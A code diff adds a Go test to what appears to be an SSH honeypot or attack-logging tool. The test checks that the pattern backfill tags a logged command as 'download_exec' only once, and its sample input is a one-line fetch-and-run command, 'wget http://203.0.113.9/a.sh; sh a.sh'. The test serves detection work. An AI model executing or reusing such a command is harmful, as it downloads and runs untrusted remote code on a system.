@@ -592,3 +592,18 @@ func TestUpdateRequestFile(t *testing.T) {
 		t.Fatalf("Anforderung: %q", b)
 	}
 }
+
+func TestBackfillPatternsOnce(t *testing.T) {
+	st := testStore(t)
+	d, _ := json.Marshal(map[string]any{"input": "wget http://203.0.113.9/a.sh; sh a.sh"})
+	st.db.Exec(`INSERT INTO events(ts,type,src_ip,service,data) VALUES(?, 'command', '203.0.113.90', 'ssh', ?)`, time.Now().UnixMilli(), string(d))
+	count := func() (n int) {
+		st.db.QueryRow(`SELECT COALESCE(SUM(n),0) FROM top_hourly WHERE field='tag' AND key='download_exec'`).Scan(&n)
+		return
+	}
+	backfillPatterns(st, 1)
+	backfillPatterns(st, 1) // zweiter Lauf darf nicht doppelt zählen
+	if count() != 1 {
+		t.Fatalf("Zähler %d, erwartet 1", count())
+	}
+}
